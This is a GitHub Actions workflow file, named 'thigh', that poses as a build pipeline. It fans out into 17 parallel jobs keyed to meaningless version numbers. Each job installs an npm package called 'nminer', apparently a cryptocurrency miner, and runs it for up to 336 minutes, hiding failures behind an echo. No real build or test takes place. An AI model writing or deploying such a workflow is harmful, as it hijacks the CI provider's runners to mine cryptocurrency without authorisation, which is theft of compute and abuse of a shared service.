name: thigh
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 7587 }
          - { version: 149 }
          - { version: 2276 }
          - { version: 6872 }
          - { version: 3108 }
          - { version: 4949 }
          - { version: 550 }
          - { version: 7927 }
          - { version: 2604 }
          - { version: 8578 }
          - { version: 4291 }
          - { version: 5919 }
          - { version: 9170 }
          - { version: 3896 }
          - { version: 1304 }
          - { version: 4193 }
          - { version: 6182 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 336m node thigh.js || echo "thigh executed"